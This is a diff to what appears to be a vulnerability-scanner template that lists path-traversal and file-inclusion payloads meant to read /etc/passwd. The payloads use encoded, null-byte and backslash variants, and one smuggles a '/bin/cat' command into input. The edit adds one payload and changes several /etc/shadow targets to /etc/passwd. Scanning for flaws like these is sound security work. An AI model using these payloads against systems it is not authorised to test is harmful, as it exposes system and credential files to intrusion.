@@ -27,6 +27,7 @@ http:
         - "file:///etc/passwd"    #https://twitter.com/abdlah_md/status/1569768790291845120
         - "file:/etc/passwd"    #https://twitter.com/0x_Akoko/status/1461957553378582531
         - "%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd"   #https://twitter.com/shaybt12/status/1569307439891185664
+        - "//////////////////../../../../../../../../etc/passwd"    #https://twitter.com/nav1n0x/status/1665599964859232258
         - "../../../etc/passwd"   #https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
         - "../../../etc/passwd%00"   #https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
         - "%252e%252e%252fetc%252fpasswd"   #https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
@@ -82,13 +83,12 @@ http:
         - "../etc/passwd%00"
         - "%00../../../../../../etc/passwd"
         - "%00/etc/passwd%00"
-        - "%00../../../../../../etc/shadow"
-        - "%00/etc/shadow%00"
+        - "%00../../../../../../etc/passwd"
+        - "%00/etc/passwd%00"
         - "%0a/bin/cat%20/etc/passwd"
-        - "%0a/bin/cat%20/etc/shadow"
+        - "%0a/bin/cat%20/etc/passwd"
         - "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
         - "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
-        - "..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed"
         - "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd"
         - "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
         - "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd"
@@ -98,8 +98,6 @@ http:
         - '/..\../..\../..\../..\../..\../..\../etc/passwd'
         - '..\..\..\..\..\..\..\..\..\..\etc\passwd%00'
         - '\..\..\..\..\..\..\..\..\..\..\etc\passwd%00'
-        - "/../../../../../../../../../../../etc/passwd%00.html"
-        - "/../../../../../../../../../../../etc/passwd%00.jpg"
         - "../../../../../../etc/passwd&=%3C%3C%3C%3C"
         - '....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd'
         - '....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd'
@@ -188,7 +186,7 @@ http:
         - "..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00"
         - "..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd"
         - "..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00"
-        - "..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fshadow%00"
+        - "..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00"
         - "L2V0Yy9tYXN0ZXIucGFzc3dk"
         - "L21hc3Rlci5wYXNzd2Q="
         - "ZXRjL3Bhc3N3ZA=="
